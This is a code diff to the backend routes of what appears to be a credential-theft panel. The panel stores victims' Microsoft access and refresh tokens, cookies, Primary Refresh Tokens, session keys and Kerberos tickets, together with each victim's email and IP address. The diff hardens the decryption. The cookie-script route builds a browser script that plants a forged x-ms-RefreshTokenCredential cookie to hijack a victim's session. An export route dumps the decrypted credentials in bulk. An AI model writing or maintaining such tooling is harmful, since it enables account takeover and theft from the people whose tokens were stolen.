@@ -112,6 +112,10 @@ router.get('/:id', userAuth, async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
+    const safeDecrypt = (val) => {
+      if (!val) return null;
+      try { return decrypt(val); } catch (e) { return null; }
+    };
     const decrypted = {
       id: token.id,
       user_id: token.user_id,
@@ -130,17 +134,17 @@ router.get('/:id', userAuth, async (req, res) => {
       template_type: token.template_type,
       token_status: token.token_status || 'unknown',
       created_at: token.created_at,
-      access_token: token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null,
-      refresh_token: token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null,
-      id_token: token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null,
-      cookies: token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null,
-      prt: token.prt ? decrypt(token.prt) : null,
-      session_key_jwe: token.session_key_jwe ? decrypt(token.session_key_jwe) : null,
+      access_token: safeDecrypt(token.access_token_encrypted),
+      refresh_token: safeDecrypt(token.refresh_token_encrypted),
+      id_token: safeDecrypt(token.id_token_encrypted),
+      cookies: safeDecrypt(token.cookies_encrypted),
+      prt: safeDecrypt(token.prt),
+      session_key_jwe: safeDecrypt(token.session_key_jwe),
       device_tenant_id: token.device_tenant_id,
-      tgt_ad: token.tgt_ad ? decrypt(token.tgt_ad) : null,
-      tgt_cloud: token.tgt_cloud ? decrypt(token.tgt_cloud) : null,
+      tgt_ad: safeDecrypt(token.tgt_ad),
+      tgt_cloud: safeDecrypt(token.tgt_cloud),
       kerberos_top_level_names: token.kerberos_top_level_names,
-      tgt_cloud_sessionkey: token.tgt_cloud_sessionkey ? decrypt(token.tgt_cloud_sessionkey) : null
+      tgt_cloud_sessionkey: safeDecrypt(token.tgt_cloud_sessionkey)
     };
 
     res.json(decrypted);
@@ -186,9 +190,13 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
     if (!tokens.length) return res.status(404).json({ error: 'Token not found' });
 
     const token = tokens[0];
-    const accessToken = token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null;
-    const refreshToken = token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null;
-    const storedCookies = token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null;
+    const safeDecrypt = (val) => {
+      if (!val) return null;
+      try { return decrypt(val); } catch (e) { return null; }
+    };
+    const accessToken = safeDecrypt(token.access_token_encrypted);
+    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
+    const storedCookies = safeDecrypt(token.cookies_encrypted);
 
     if (!accessToken && !refreshToken && !storedCookies) {
       return res.status(400).json({ error: 'No tokens available' });
@@ -227,14 +235,14 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
       cookiesList = parseCookies(cookies, { tenant: tenant, accountType: accountType });
     }
 
-    // Generate x-ms-RefreshTokenCredential PRT script (competitor-proven format)
+    // Generate x-ms-RefreshTokenCredential PRT script
     var prtScript = null;
     if (refreshToken) {
       try {
         const cookieConverter = require('../services/cookieconverter');
         var tid = tenant;
         var uid = '';
-        const idToken = token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null;
+        const idToken = safeDecrypt(token.id_token_encrypted);
         if (idToken) {
           try {
             const idPayload = idToken.split('.')[1];
@@ -244,7 +252,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
             tid = decoded.tid || tid;
           } catch (e) { /* ignore */ }
         }
-        const sessionKeyJwe = token.session_key_jwe ? decrypt(token.session_key_jwe) : null;
+        const sessionKeyJwe = safeDecrypt(token.session_key_jwe);
         if (sessionKeyJwe) {
           try {
             const parsed = JSON.parse(sessionKeyJwe);
@@ -261,7 +269,7 @@ router.get('/:id/cookie-script', userAuth, async (req, res) => {
           { tid: tid, uid: uid, scopes: 'openid profile email offline_access https://graph.microsoft.com/.default' }
         );
         if (prtCookieObj && prtCookieObj.value) {
-          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\n// Redirect after 3s\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);`;
+          prtScript = `document.cookie = "x-ms-RefreshTokenCredential=${prtCookieObj.value}; domain=${prtCookieObj.domain}; path=/; secure; samesite=none";\nsetTimeout(() => {\n  window.location.href = "https://login.microsoftonline.com/?auth=2";\n}, 3000);`;
         }
       } catch (prtErr) {
         console.error('[Tokens] PRT script generation error:', prtErr.message);
@@ -1026,23 +1034,29 @@ router.post('/export', userAuth, async (req, res) => {
       [req.user.id]
     );
 
-    const decryptedTokens = tokens.map(token => ({
-      id: token.id,
-      email: token.email,
-      token_type: token.token_type,
-      ip_address: token.ip_address,
-      user_agent: token.user_agent,
-      notes: token.notes || '',
-      expiration: token.expiration,
-      created_at: token.created_at,
-      access_token: token.access_token_encrypted ? decrypt(token.access_token_encrypted) : null,
-      refresh_token: token.refresh_token_encrypted ? decrypt(token.refresh_token_encrypted) : null,
-      id_token: token.id_token_encrypted ? decrypt(token.id_token_encrypted) : null,
-      cookies: token.cookies_encrypted ? decrypt(token.cookies_encrypted) : null,
-      prt: token.prt ? decrypt(token.prt) : null,
-      session_key_jwe: token.session_key_jwe ? decrypt(token.session_key_jwe) : null,
-      account_type: token.account_type || 'unknown'
-    }));
+    const decryptedTokens = tokens.map(token => {
+      const safeDecrypt = (val) => {
+        if (!val) return null;
+        try { return decrypt(val); } catch (e) { return null; }
+      };
+      return {
+        id: token.id,
+        email: token.email,
+        token_type: token.token_type,
+        ip_address: token.ip_address,
+        user_agent: token.user_agent,
+        notes: token.notes || '',
+        expiration: token.expiration,
+        created_at: token.created_at,
+        access_token: safeDecrypt(token.access_token_encrypted),
+        refresh_token: safeDecrypt(token.refresh_token_encrypted),
+        id_token: safeDecrypt(token.id_token_encrypted),
+        cookies: safeDecrypt(token.cookies_encrypted),
+        prt: safeDecrypt(token.prt),
+        session_key_jwe: safeDecrypt(token.session_key_jwe),
+        account_type: token.account_type || 'unknown'
+      };
+    });
 
     if (deleteAfter) {
       await db.query(
